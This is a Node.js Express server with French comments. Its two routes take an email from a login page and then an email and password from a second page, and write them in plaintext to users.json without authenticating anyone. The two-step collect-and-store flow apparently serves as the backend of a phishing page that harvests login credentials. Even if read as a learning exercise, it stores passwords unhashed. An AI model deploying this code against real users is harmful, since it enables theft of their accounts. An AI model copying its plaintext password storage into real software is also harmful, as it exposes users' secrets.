// server.js
const express = require("express");
const path = require("path");
const fs = require("fs").promises;

const app = express();
const PORT = 3000;
const DATA_FILE = path.join(__dirname, "users.json");

app.use(express.json());
// Sert les fichiers statiques (login.html, password.html, style.css, ...)
app.use(express.static(path.join(__dirname, "public")));

// Utilitaire : lit users.json ou retourne []
async function readData() {
  try {
    const raw = await fs.readFile(DATA_FILE, "utf8");
    return JSON.parse(raw);
  } catch (err) {
    return []; // fichier absent ou mal formé -> retourne tableau vide
  }
}

// Utilitaire : écrit tableau dans users.json
async function writeData(data) {
  await fs.writeFile(DATA_FILE, JSON.stringify(data, null, 2), "utf8");
}

// Route pour enregistrer seulement l'email (appelée depuis login.html)
app.post("/save-email", async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ ok: false, error: "email manquant" });

    const list = await readData();
    // On ajoute une entrée avec email et horodatage
    list.push({ email, createdAt: new Date().toISOString(), password: null });
    await writeData(list);

    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: "erreur serveur" });
  }
});

// Route pour enregistrer email + mot de passe (appelée depuis password.html)
app.post("/save-credentials", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ ok: false, error: "champs manquants" });

    const list = await readData();
    // Option 1: on ajoute une nouvelle entrée complète
    list.push({ email, password, createdAt: new Date().toISOString() });
    await writeData(list);

    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: "erreur serveur" });
  }
});

// Démarrage
app.listen(PORT, () => {
  console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
